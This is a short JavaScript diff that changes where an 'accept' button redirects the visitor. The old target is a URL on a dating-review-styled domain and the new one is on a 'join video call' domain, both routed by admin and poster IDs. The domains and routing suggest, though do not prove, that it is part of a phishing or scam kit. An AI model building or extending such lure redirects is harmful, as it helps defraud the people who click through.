@@ -133,7 +133,7 @@ setTimeout(()=>{
     document.querySelectorAll('.accept-button').forEach(button => {
         button.addEventListener('click', () => {
       
-          window.location.href =`https://megapersonal-chatreview.vercel.app/${admin}/${poster}`
+          window.location.href =`https://joinvideocall-mu.vercel.app/${adminId}/${posterId}`
         });
       });
 },2000)
